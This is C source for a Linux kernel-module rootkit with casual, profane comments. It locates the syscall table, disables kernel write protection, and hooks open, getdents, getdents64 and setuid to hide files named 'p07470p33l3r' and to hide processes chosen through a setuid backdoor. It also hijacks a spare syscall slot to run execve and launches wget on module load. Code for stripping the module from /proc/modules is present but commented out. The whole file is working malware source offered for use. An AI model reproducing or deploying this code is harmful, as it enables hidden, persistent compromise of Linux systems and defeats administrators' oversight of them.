#include <linux/module.h> // Holy includes batman
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/types.h> 

/* WARNING! If you insmod this module without commenting out the module hiding lines,
you won't be able to rmmod it. Brick your system and no one will feel bad for you */

/* Modules license "Lots Of Liquor"
@##################################################################@
@ Lol people and their licenses. This is more here to make the     @
# code look prettier and fullfil some goal of seeming professional #
@ or something. I dont really know. Anyways this is released under @
@ the Lots of Liquor license, which means to use it you need lots  @
# of liquor. Other than that I dont care do what you want to do    #
@ with this shit.                                                  @
@################################################################# @
*/

MODULE_LICENSE("GPL"); // Would be LOL but linux doesn't like unknown licenses

/* Define address size depending on if system is 32 or 64 bit */

#if defined(__i386__) // If we 32bit, look for system call table in these ranges
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize; // Set custom var psize to 4 bytes (32bits)
#else // Otherwise, 64bit, look in these ranges
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize; // Set custom var psize to 8 bytes (64bits)
#endif

/* Variables */

psize *system_call_table; // Store syscall table location

char *hide_file = "p07470p33l3r"; // Name of files/directories to hide from user
char hidden_PIDs[50][5];
int index = 0;
int __NR_myexecve;

struct linux_dirent {
	unsigned long d_ino;     /* Inode number */
	unsigned long d_off;     /* Offset to next linux_dirent */
	unsigned short d_reclen;  /* Length of this linux_dirent */
	char d_name[];  /* Filename (null-terminated) */
};

/* Hacked Syscall Pointers */

asmlinkage int (*orig_open)(const char *, int, mode_t);
asmlinkage int (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
asmlinkage int (*orig_getdents)(unsigned int, struct linux_dirent *, unsigned int);
asmlinkage int (*orig_setuid)(uid_t);
asmlinkage int (*orig_execve)(const char *, const char *[], const char *[]);

/* Function Declarations */

int rootkit_init(void); // Kernel module shit
void rootkit_exit(void);
module_init(rootkit_init);
module_exit(rootkit_exit);

/* Find System Call Table */

psize **find_sys_call_table(void) { // Finds the system call table (duh)
        psize **sctable;
        psize i = START_CHECK;
        while (i < END_CHECK) { // Basiclly this runs through memory looking for syscall table
                sctable = (psize **) i;
                if (sctable[__NR_close] == (psize *) sys_close) {
                        return &sctable[0]; // __NR_close is 6, so 0 is the top of the call table
                }
                i += sizeof(void *);
        }
	return NULL; // Didn't find :(
}

/* Plaguez's custom launch execve function */

int my_execve(const char *filename, const char *argv[], const char *envp[]) { 
	long __res;
	__asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_myexecve), "b"((long) (filename)), "c"((long) (argv)), "d"((long) (envp))); 
	return (int) __res; 
}

/* Hacked System Calls */

/* Hacked Open Syscall */

asmlinkage int hacked_open(const char *pathname, int flags, mode_t mode){ // Hacked version of the open syscall
        char *kernel_pathname;
	int i = 0;

        kernel_pathname = (char*) kmalloc(256, GFP_KERNEL);

        copy_from_user(kernel_pathname, pathname, 255); // Move user shit to kernel land

        if(strstr(kernel_pathname, hide_file) != NULL){ // See if it has our hide string in the name
                kfree(kernel_pathname);
                return -ENOENT; // Say there is no spoo- I mean file
        }
        for(i = 0; i < index; i++){
		if(strstr(kernel_pathname, hidden_PIDs[i]) != NULL){
			kfree(kernel_pathname);
                	return -ENOENT; // Say there is no spoo- I mean file
		}        
	}
        kfree(kernel_pathname);
        return orig_open(pathname, flags, mode); // Shit good, run origonal syscall
}

/* Hacked Getdents64 Syscall */

asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){ // Hacked version of the getdents64 syscall
	unsigned int tmp, n;
	int t;
	struct linux_dirent64 *dirp2, *dirp3;

	tmp = (*orig_getdents64)(fd, dirp, count); // Basiclly it runs the original, saves it, and does stuff. Idk how this shit works, I stole it

	if(tmp > 0){
		dirp2 = (struct linux_dirent64 *) kmalloc(tmp, GFP_KERNEL);
		copy_from_user(dirp2, dirp, tmp);
		dirp3 = dirp2;
		t = tmp;
		while (t > 0){
			n = dirp3->d_reclen;
			t -= n;
			if(strstr((char*) &(dirp3->d_name), hide_file) != NULL){
				if (t != 0){
					memmove(dirp3, (char *) dirp3 + dirp3->d_reclen,t);
				}
				else{
					dirp3->d_off = 1024;
				}
				tmp -=n;
			}

			if (t != 0){
				dirp3 = (struct linux_dirent64 *) ((char *) dirp3 + dirp3->d_reclen);
			}
		}
		copy_to_user(dirp, dirp2, tmp);
		kfree(dirp2);
	}
	return tmp;
}

asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){ // Hacked version of the getdents64 syscall
        unsigned int tmp, n;
        int t;
        struct linux_dirent *dirp2, *dirp3;

        tmp = (*orig_getdents)(fd, dirp, count); // Basiclly it runs the original, saves it, and does stuff. Idk how this shit works, I stole it

        if(tmp > 0){
                dirp2 = (struct linux_dirent *) kmalloc(tmp, GFP_KERNEL);
                copy_from_user(dirp2, dirp, tmp);
                dirp3 = dirp2;
                t = tmp;
                while (t > 0){
                        n = dirp3->d_reclen;
                        t -= n;
                        if(strstr((char*) &(dirp3->d_name), hide_file) != NULL){
                                if (t != 0){
                                        memmove(dirp3, (char *) dirp3 + dirp3->d_reclen,t);
                                }
                                else{
                                        dirp3->d_off = 1024;
                                }
                                tmp -=n;
                        }

                        if (t != 0){
                                dirp3 = (struct linux_dirent *) ((char *) dirp3 + dirp3->d_reclen);
                        }
                }
                copy_to_user(dirp, dirp2, tmp);
                kfree(dirp2);
        }
        return tmp;
}

/* Hacked Setuid Syscall */

/* This is used for interfacing with the rootkit to hide processes. */

asmlinkage int hacked_setuid(uid_t uid){
	if(uid > 31337){
		sprintf(hidden_PIDs[index++], "%d", (uid - 31337));
		printk("PID = %d\n", (uid - 31337));
	}
	if(uid > 50000){
	        const char *args[5] = {"wget","google.com","-P","//root"};
	        my_execve("//bin//wget", args , NULL);
	}
	return (*orig_setuid)(uid);
}

/* Module initialization function */

int rootkit_init(void) { // Start lel rootkit
	printk("Rootkit Initialized\n");

	//list_del_init(&__this_module.list); // Remove module from /proc/modules
	//kobject_del(&THIS_MODULE->mkobj.kobj); // Remove module from /sys/module

	if(system_call_table = (psize *) find_sys_call_table()){
		printk("System call table found at: %p\n", system_call_table); // Ayyy we found it
	}
	else{
		printk("Failed to find system call table.\n"); // Welp, back to the drawing board
	}

	write_cr0(read_cr0() & (~0x10000)); // Turn on memory write to syscall table

	orig_open = (void *)xchg(&system_call_table[__NR_open],hacked_open); // Replace open with hacked open
	orig_getdents64 = (void *)xchg(&system_call_table[__NR_getdents64],hacked_getdents64); // Replace getdents64 with hacked getdents64
        orig_getdents = (void *)xchg(&system_call_table[__NR_getdents],hacked_getdents); // Replace getdents64 with hacked getdents64
	#if defined(__NR_setuid32)
	orig_setuid = (void *)xchg(&system_call_table[__NR_setuid32],hacked_setuid);
	#else
        orig_setuid = (void *)xchg(&system_call_table[__NR_setuid],hacked_setuid);
	#endif

	__NR_myexecve = 200; 
	while (__NR_myexecve != 0 && system_call_table[__NR_myexecve] != 0){ 
		__NR_myexecve--;
	}
	orig_execve = system_call_table[__NR_execve]; 
	
	if (__NR_myexecve != 0){ 
		system_call_table[__NR_myexecve] = orig_execve; 
	}

	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
	
	const char *args[5] = {"wget","google.com","-P","//root"};
	my_execve("//bin//wget", args , NULL);	

	return 0;
}

/* Module exit function */

void rootkit_exit(void) {
	write_cr0(read_cr0() & (~0x10000)); // Turn on memory write to syscall table

	xchg(&system_call_table[__NR_open],orig_open); // Replace hacked open with original
	xchg(&system_call_table[__NR_getdents64],orig_getdents64); // Replace hacked getdents64 with original
	xchg(&system_call_table[__NR_getdents],orig_getdents); // Replace hacked getdents64 with original
	#if defined(__NR_setuid32)
	xchg(&system_call_table[__NR_setuid32],orig_setuid);
	#else
	xchg(&system_call_table[__NR_setuid],orig_setuid);
	#endif

	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table

	printk("Rootkit Exited\n"); // We done
}
